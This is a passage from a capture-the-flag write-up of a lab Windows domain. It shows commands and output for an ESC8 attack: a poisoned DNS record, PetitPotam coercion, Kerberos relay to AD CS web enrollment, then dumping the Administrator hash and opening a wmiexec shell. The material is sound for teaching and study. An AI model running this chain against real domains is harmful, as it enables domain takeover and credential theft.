-rw-rw-rw-        924  Wed Jun  4 12:54:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21).crt
-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-20).crt
-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-22).crt
-rw-rw-rw-        924  Wed Jun  4 12:56:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22).crt
-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-21).crt
-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-23).crt
-rw-rw-rw-        924  Wed Jun  4 13:36:17 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23).crt
-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-22).crt
-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-24).crt
-rw-rw-rw-        924  Wed Jun  4 13:38:20 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24).crt
-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-23).crt
-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-25).crt
-rw-rw-rw-        924  Wed Jun  4 13:40:21 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25).crt
-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-24).crt
-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-26).crt
-rw-rw-rw-        924  Wed Jun  4 14:04:01 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26).crt
-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-25).crt
-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-27).crt
-rw-rw-rw-        924  Wed Jun  4 14:05:56 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27).crt
-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-26).crt
-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-28).crt
-rw-rw-rw-        924  Wed Jun  4 14:07:56 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28).crt
-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28-27).crt
-rw-rw-rw-        924  Mon Jun 16 20:37:22 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(29).crt
-rw-rw-rw-        924  Sun Sep 15 13:21:57 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3).crt
-rw-rw-rw-       1390  Sun Sep 29 09:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-2).crt
-rw-rw-rw-       1390  Sun Sep 29 09:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-4).crt
-rw-rw-rw-        924  Mon Jun 16 20:39:25 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(30).crt
-rw-rw-rw-        924  Mon Jun 16 20:41:25 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(31).crt
-rw-rw-rw-        924  Sun Sep 15 13:24:12 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4).crt
-rw-rw-rw-       1390  Sun Sep 29 09:41:30 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-3).crt
-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-5).crt
-rw-rw-rw-        924  Sun Sep 29 09:43:51 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5).crt
-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-4).crt
-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-6).crt
-rw-rw-rw-        924  Sun Sep 29 09:44:59 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6).crt
-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-5).crt
-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-7).crt
-rw-rw-rw-        924  Sun Sep 29 09:46:59 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7).crt
-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-6).crt
-rw-rw-rw-       1390  Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-8).crt
-rw-rw-rw-        924  Thu Apr 10 08:40:45 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8).crt
-rw-rw-rw-       1390  Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-7).crt
-rw-rw-rw-       1390  Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-9).crt
-rw-rw-rw-        924  Thu Apr 10 08:42:44 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9).crt
-rw-rw-rw-       1390  Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-10).crt
-rw-rw-rw-       1390  Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-8).crt
-rw-rw-rw-        885  Fri Sep 13 10:50:51 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA.crt
-rw-rw-rw-        331  Fri Sep 13 15:17:59 2024 nsrev_cicada-DC-JPQ225-CA.asp

```

These are public keys, and not sensitive.

### ADCS Enumeration

Given the ADCS activity, I’ll scan for ADCS vulnerabilities using `certipy`:

```

oxdf@hacky$ certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 6B8F71DF18F81D804D7BF4E3504C6C4D
    Certificate Validity Start          : 2025-06-16 20:31:15+00:00
    Certificate Validity End            : 2525-06-16 20:41:15+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates

```

It does not find any vulnerable templates, but it finds that the CA itself is vulnerable to ESC8.

### ESC8 Exploitation

#### Background

The [Certipy Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment) describes ESC8 as:

> ESC8 describes a privilege escalation vector where an attacker performs an NTLM relay attack against an AD CS HTTP-based enrollment endpoint. These web-based interfaces provide alternative methods for users and computers to request certificates.

The wiki goes on to describe the attack in six steps:

> 1. **Coerce Authentication:** The attacker coerces a privileged account to authenticate to a machine controlled by the attacker using NTLM. Common targets for coercion include Domain Controller machine accounts (e.g., using tools like PetitPotam or Coercer, or other RPC-based coercion techniques against MS-EFSRPC, MS-RPRN, etc.) or Domain Admin user accounts (e.g., via phishing or other social engineering that triggers an NTLM authentication).
> 2. **Set up NTLM Relay:** The attacker uses an NTLM relay tool, such as Certipy’s `relay` command, listening for incoming NTLM authentications.
> 3. **Relay Authentication:** When the victim account authenticates to the attacker’s machine, Certipy captures this incoming NTLM authentication attempt and forwards (relays) it to the vulnerable AD CS HTTP web enrollment endpoint (e.g., `https://<ca_server>/certsrv/certfnsh.asp`).
> 4. **Impersonate and Request Certificate:** The AD CS web service, receiving what it believes to be a legitimate NTLM authentication from the relayed privileged account, processes subsequent enrollment requests from Certipy as that privileged account. Certipy then requests a certificate, typically specifying a template for which the relayed privileged account has enrollment rights (e.g., the “DomainController” template if a DC machine account is relayed, or the default “User” template for a user account).
> 5. **Obtain Certificate:** The CA issues the certificate. Certipy, acting as the intermediary, receives this certificate.
> 6. **Use Certificate for Privileged Access:** The attacker can now use this certificate (e.g., in a `.pfx` file) with `certipy auth` to authenticate as the impersonated privileged account via Kerberos PKINIT, potentially leading to full domain compromise.

Basically if I can get the machine to authenticate back to me, I’ll relay that auth to ADCS and get a certificate as the machine account. [This post](https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html) from Tyranid’s Lair shows how it’s possible to relay Kerberos authentication.

#### Strategies

There are at least two ways to approach this exploitation.

The first is to create a Windows VM and join it to the domain. The MachineAccountQuota is set to 10 (the default), so this should be do able:

```

oxdf@hacky$ netexec ldap DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M maq
LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225        [*] None (name:DC-JPQ225) (domain:cicada.vl) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225        [*] Getting the MachineAccountQuota
MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225        MachineAccountQuota: 10

```

With a Windows host on the domain, I can run [RemoteKrbRelay](https://github.com/CICADA8-Research/RemoteKrbRelay), which will handle the entire exploit, coercing authentication and relaying it to the HTTP certificate server.

The other approach is from my Linux VM, where I’ll use the strategy described in [this Synactiv post](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html) to add a DNS record that includes a serialized SPN that will trick the server into requesting a Kerberos ticket for the machine account but connects to the malicious record which points to the attacker. The attacker can relay that back to the DC to request a ticket.

```

flowchart TD;
    A[Auth as\nRosie.Powell]-->B(Join Windows VM\nto domain);
    B-->C(RemoteKrbRelay.exe);
    C-->D[Certificate as\nDC-JPQ225$];
    A-->E(Add malicious\nDNS record);
    E-->F(Coerce with\nPetitPotam);
    F-->D;

```

I’ll only show the Linux attack path here. The machine author, xct, covers the first approach in [his writeup](https://vuln.dev/vulnlab-cicada/).

#### Attack

The record to add is structured as `<host><empty CREDENTIAL_TARGET_INFOMATION structure>`, which in this case will be `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. I’ll set the DNS record with `bloodyAD`:

```

oxdf@hacky$ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.79
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added

```

I’ll start `certipy relay` targeting the ADCS webserver, and it listens on SMB:

```

oxdf@hacky$ certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
Certipy v5.0.3 - by Oliver Lyak (ly4k)
[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445

```

The `netexec` module `coerce_plus` will check several different methods for coercing authentication from the machine account:

```

oxdf@hacky$ netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug

```

In theory any of these should work. I have the best luck with PetitPotam. To trigger it, I’ll give `netexec` the `LISTENER` of the malicious DNS record, and the `METHOD`:

```

oxdf@hacky$ netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile

```

At the relay, there’s a connection, and it eventually creates a `.pfx` file:

```

oxdf@hacky$ certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
Certipy v5.0.3 - by Oliver Lyak (ly4k)
[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] SMBD-Thread-2 (process_request_thread): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Authenticating against http://dc-jpq225.cicada.vl as / SUCCEED
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 95
[*] Retrieving certificate for request ID: 95
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=95 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
[*] Exiting...

```

With the certificate I can authenticate as the computer account:

```

oxdf@hacky$ certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3

```

This returns both a TGT and the NTLM for the account.

## Shell as Administrator

### Dump Hashes

The machine account cannot get a shell directly, but this TGT can be used to dump hashes from the DC:

```

oxdf@hacky$ KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl -just-dc-user administrator
/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
[*] Cleaning up... 

```

The hash is valid:

```

oxdf@hacky$ netexec smb dc-jpq225.cicada.vl -u administrator -H 85a0da53871a9d56b6cd05deda3a5e87 -k
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [*]  x64 (name:dc-jpq225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc-jpq225.cicada.vl 445    dc-jpq225        [+] cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)

```

### Shell

A quick way to get a shell from here is `wmiexec`:

```

oxdf@hacky$ wmiexec.py cicada.vl/administrator@dc-jpq225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] SMBv3.0 dialect used
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
cicada\administrator

```

And grab the flags:

```

C:\users\administrator\desktop>type user.txt
c6a8fc2e************************
C:\users\administrator\desktop>type root.txt
65d0019f************************

```